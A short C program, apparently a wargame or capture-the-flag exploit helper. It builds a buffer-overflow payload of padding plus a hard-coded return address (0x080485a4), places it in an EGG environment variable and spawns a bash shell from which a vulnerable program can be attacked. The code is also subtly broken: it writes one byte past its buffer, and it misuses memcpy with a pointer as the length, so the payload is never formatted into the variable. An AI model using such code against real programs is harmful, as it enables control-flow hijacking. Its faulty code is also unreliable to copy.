#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define RETURN_OFFSET 32

int main(int argc, char* argv[]) {
    char buff[RETURN_OFFSET + 4];

    memset(buff, 'A', RETURN_OFFSET);

    // 0x080485a4
    buff[RETURN_OFFSET] = 0xa4;
    buff[RETURN_OFFSET + 1] = 0x85;
    buff[RETURN_OFFSET + 2] = 0x04;
    buff[RETURN_OFFSET + 3] = 0x08;
    buff[RETURN_OFFSET + 4] = '\0';

    char egg[150];
    memcpy(egg,"EGG=%s", buff);
	putenv(egg);
	system("/bin/bash");	
    
    return 0;
}